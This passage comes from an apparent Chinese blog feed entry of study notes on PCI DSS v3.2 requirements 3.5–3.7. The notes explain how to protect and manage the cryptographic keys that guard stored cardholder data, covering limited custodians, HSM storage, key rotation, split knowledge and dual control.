id="3-5-记录并实施保护程序，以保护用于防止存储的持卡人数据被泄露和滥用的密钥："><a href="#3-5-记录并实施保护程序，以保护用于防止存储的持卡人数据被泄露和滥用的密钥：" class="headerlink" title="3.5 记录并实施保护程序，以保护用于防止存储的持卡人数据被泄露和滥用的密钥："></a>3.5 记录并实施保护程序，以保护用于防止存储的持卡人数据被泄露和滥用的密钥：</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-455b379c6b5eb4fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.5"><br>这里强调的是保护持卡人数据的加密等方式的密钥，就是我们已经用锁将我们的敏感信息锁起来了，那么我们拥有这个打开锁的钥匙，我们就要保护好这个钥匙了。我们要保证这个密钥的管理使用都是有规范程序的，有记录的确保不会被滥用。</p><h4 id="3-5-1-仅针对服务商的额外要求：维护包含以下内容的加密架构文档描述："><a href="#3-5-1-仅针对服务商的额外要求：维护包含以下内容的加密架构文档描述：" class="headerlink" title="3.5.1 仅针对服务商的额外要求：维护包含以下内容的加密架构文档描述："></a>3.5.1 仅针对服务商的额外要求：维护包含以下内容的加密架构文档描述：</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c35d5677b34d1e4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.5.1"><br>维护包含以下内容的加密架构文档描述：<br>1、用于保护持卡人数据的所有算法、协议和密钥的详情，包括密钥强度和到期日<br>2、每个密钥只要用途的说明<br>3、用于进行密钥管理的任何HSM和其他SCD的清单<br>这里是对加密服务提供商来说的要求，必须有一个维护加密体系的一个文档，包括使用的算法，协议之类的内容，以及密钥的用途说明等，都得有详细的记录。这样方便使用这个加密服务的客户了解整个体系，并可根据不同业务情况去完善或者删减这个架构体系，以及后期的检测。</p><h4 id="3-5-2-仅极少数必须的保管人有密钥的访问权"><a href="#3-5-2-仅极少数必须的保管人有密钥的访问权" class="headerlink" title="3.5.2 仅极少数必须的保管人有密钥的访问权"></a>3.5.2 仅极少数必须的保管人有密钥的访问权</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a37c5374c80fb082.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.5.2"><br>这个很容易理解，越少人知道才是越安全的。越少人拥有着密钥的访问权，我们便可更加方便的保护这个密钥，也更方便监控和管理。这让我想起了之前的一个矿机公司的eth被盗的事件，当时考虑了很多情况，最后发现是内部人员将服务器的密码记录在了第三方的云笔记软件当中，最后被窃取，导致eth被窃取。这么多服务器密码在一个人手里，安全意识是一方面，最重要的是密码应该只掌握在少数重要的保管人手里，有时为了安全，甚至必须几人保管一个密码。</p><h4 id="3-5-3-存储用于始终以下面的一种（或多种）形式加密-解密持卡人数据的机密密钥和私人密钥"><a href="#3-5-3-存储用于始终以下面的一种（或多种）形式加密-解密持卡人数据的机密密钥和私人密钥" class="headerlink" title="3.5.3 存储用于始终以下面的一种（或多种）形式加密/解密持卡人数据的机密密钥和私人密钥"></a>3.5.3 存储用于始终以下面的一种（或多种）形式加密/解密持卡人数据的机密密钥和私人密钥</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-4a3cf999fb7fda79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.5.3"><br>1、使用至少与数据加密密钥一样强效且与数据加密密钥分开存储的密钥加密密钥进行加密<br>2、在安全加密设备（例如，硬件（主机）安全模块（HSM）或PTS批准的交互点设备）内<br>3、根据行业认可的方法，作为至少两个全长密钥组分或密钥共享<br>这里同样是一个持卡人数据机密密钥的安全存储要求。我们对于这个加密了持卡人数据的密钥也得用同一安全等级来保护。这里讲了几个方法，主要就是说同一安全等级，同时<br>两个密钥要分开存储，不然加密就没意义了，还有密钥组之类的方法。</p><h4 id="3-5-4-尽量减少密钥存储的地方"><a href="#3-5-4-尽量减少密钥存储的地方" class="headerlink" title="3.5.4 尽量减少密钥存储的地方"></a>3.5.4 尽量减少密钥存储的地方</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8fbc949c12244a22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.5.4"><br>这个和前面的减少有密钥访问权的人一样，越少的地方存储着密钥，我就可以用更好的，更全面，更快速的措施去保护这个密钥。便于控制以及降低安全隐患。</p><h3 id="3-6-充分记录并实施用于持卡人数据加密的所有秘钥管理流程和程序"><a href="#3-6-充分记录并实施用于持卡人数据加密的所有秘钥管理流程和程序" class="headerlink" title="3.6 充分记录并实施用于持卡人数据加密的所有秘钥管理流程和程序"></a>3.6 充分记录并实施用于持卡人数据加密的所有秘钥管理流程和程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7d554415965b9e1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6"><br>简单概括就是把密钥的管理流程化，有记录有规定的流程。密钥的管理方式是确保我们加密方案持续安全的关键部分。进入密钥的管理漏洞百出，就算我们的加密方式再完善也只是形同虚设。</p><h4 id="3-6-1-生成强效密钥"><a href="#3-6-1-生成强效密钥" class="headerlink" title="3.6.1 生成强效密钥"></a>3.6.1 生成强效密钥</h4><h4 id="3-6-2-安全的密钥分配"><a href="#3-6-2-安全的密钥分配" class="headerlink" title="3.6.2 安全的密钥分配"></a>3.6.2 安全的密钥分配</h4><h4 id="3-6-3-安全的密钥存储"><a href="#3-6-3-安全的密钥存储" class="headerlink" title="3.6.3 安全的密钥存储"></a>3.6.3 安全的密钥存储</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e0099647bd3ebe8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.1-3.6.3"><br>对于用于加密持卡人数据的密钥，我们需要做到这些流程，先说说上面这三个吧：<br>生成强效的密钥–&gt;安全的密钥分配–&gt;安全的密钥存储<br>对于密钥的管理程序来说我们首先按强效的算法生成强效的密钥，在密钥的分配中骂我们确保密钥通过安全的方式传送到密钥的保管人手中，最后在密钥的安全存储中，我们可通过在加密等方式进行安全加密存储。<br>这三个从生成，分配，存储来说明密钥的安全管理，之前说到的ETH公司被窃的事件，就是出在了密钥的存储环节，当然可能密钥的分配可能也有问题，但是最主要的还是密钥的存储。</p><h4 id="3-6-4-根据相关应用程序供应商或密钥所有人的规定并基于行业最优方法和指南（例如《NIST特别出版物800-57》），在密钥周期结束时（例如，指定期限过后或给定密钥产生一定量的密文后）对面要进行变更"><a href="#3-6-4-根据相关应用程序供应商或密钥所有人的规定并基于行业最优方法和指南（例如《NIST特别出版物800-57》），在密钥周期结束时（例如，指定期限过后或给定密钥产生一定量的密文后）对面要进行变更" class="headerlink" title="3.6.4 根据相关应用程序供应商或密钥所有人的规定并基于行业最优方法和指南（例如《NIST特别出版物800-57》），在密钥周期结束时（例如，指定期限过后或给定密钥产生一定量的密文后）对面要进行变更"></a>3.6.4 根据相关应用程序供应商或密钥所有人的规定并基于行业最优方法和指南（例如《NIST特别出版物800-57》），在密钥周期结束时（例如，指定期限过后或给定密钥产生一定量的密文后）对面要进行变更</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fc3fef199f156cbc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.4-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-4815e82d1e5851ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.4-2"><br>这个要求的意思就是根据一些行业的最优指南，我们需要定期对密钥进行变更。不仅仅是当密钥周期到的时候还有很多时候，比如某些掌握密钥的员工离职或者某些密钥上的数学难题被攻破等等，这个时候我们也要根据相关文件的最优方法更新一个安全的密钥。</p><h4 id="3-6-5-密钥的完整性变弱（列入，知道明文密钥部分的员工离职）或怀疑密码遭受威胁时，认为有必要注销或替换（例如，存档、销毁或撤销）密钥。"><a href="#3-6-5-密钥的完整性变弱（列入，知道明文密钥部分的员工离职）或怀疑密码遭受威胁时，认为有必要注销或替换（例如，存档、销毁或撤销）密钥。" class="headerlink" title="3.6.5 密钥的完整性变弱（列入，知道明文密钥部分的员工离职）或怀疑密码遭受威胁时，认为有必要注销或替换（例如，存档、销毁或撤销）密钥。"></a>3.6.5 密钥的完整性变弱（列入，知道明文密钥部分的员工离职）或怀疑密码遭受威胁时，认为有必要注销或替换（例如，存档、销毁或撤销）密钥。</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-63bbbfb4261957bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.5"><br>这算是对上面一个要求的补充，当密钥的完整性变弱，比如使用密钥组的方案存储密钥时，如果某个部分被泄露，这时候虽然完整的密钥没有，但是风险上升了，总而言之就是我们密钥被窃取的风险上升的时候，就应该根据情况对密钥进行注销，更改等操作。</p><h4 id="3-6-6-若使用手动明文密钥管理操作，则必须使用分割知识和双重控制来管理这些操作"><a href="#3-6-6-若使用手动明文密钥管理操作，则必须使用分割知识和双重控制来管理这些操作" class="headerlink" title="3.6.6 若使用手动明文密钥管理操作，则必须使用分割知识和双重控制来管理这些操作"></a>3.6.6 若使用手动明文密钥管理操作，则必须使用分割知识和双重控制来管理这些操作</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a3bac505352a794e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.6-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-87374bbb68610360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.6-2"><br>这里主要说的就是密钥管理的分割和双重控制方法，前面也说过密钥组，对密钥进行分组的方法。但是这里讲的是对明文密钥的管理方法。明文密钥的泄露风险相对于密文来说肯定相对更大，这时候结合分割和双重控制的思想就可以更加安全的保护密钥。<br>分割和双重控制的方法也很好理解，分割密钥分给多人分别管理，同时保证双方无法访问对方的密钥。很多时候还会有多重控制的结合。</p><h4 id="3-6-7-防止密钥的非授权替换"><a href="#3-6-7-防止密钥的非授权替换" class="headerlink" title="3.6.7 防止密钥的非授权替换"></a>3.6.7 防止密钥的非授权替换</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-47411dca96467df4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.7"><br>前面都说了怎么防止密钥的泄露等等，但是如果用户无法窃取我们的密钥，但是也会存在攻击者覆盖上传更改密钥的可能，这里就要保证我们的密钥的更改或者删减等有明确的授权，才能进行操作。覆盖上传，或者增加密钥在很多地方也是会出现得到，所以也是安全防护的一个重点。</p><h4 id="3-6-8-有关密钥保管人正式确认理解并接受密钥保管责任的要求"><a href="#3-6-8-有关密钥保管人正式确认理解并接受密钥保管责任的要求" class="headerlink" title="3.6.8 有关密钥保管人正式确认理解并接受密钥保管责任的要求"></a>3.6.8 有关密钥保管人正式确认理解并接受密钥保管责任的要求</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bbb940493367eac1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.6.8"><br>我们制定了密钥的体系流程，我们得实施到具体人员上面，确保每个密钥保管人已经学习，了解这个流程。</p><h3 id="3-7-确保已记录、正在使用且所有相关方了解用于保护存储持卡人数据的安全政策和操作程序"><a href="#3-7-确保已记录、正在使用且所有相关方了解用于保护存储持卡人数据的安全政策和操作程序" class="headerlink" title="3.7 确保已记录、正在使用且所有相关方了解用于保护存储持卡人数据的安全政策和操作程序"></a>3.7 确保已记录、正在使用且所有相关方了解用于保护存储持卡人数据的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d59ed3b142080bc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.7"><br>对这些保护持卡人数据的安全政策和操作程序，我们有具体的记录，并且让正在使用的相关方，工作人员理解，学习这个安全政策和操作程序。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>昨天因为体侧，回来看了一半就累的躺下了，所以今天才写完。这第三个要求讲的就是如何保护存储的持卡人数据，包括加密存储，以及加密过后密钥的管理体系等等。最重要的就是加密存储持卡人数据和密钥的管理两个方面了，很多其他公司都可以借鉴。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-三&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
</feed>
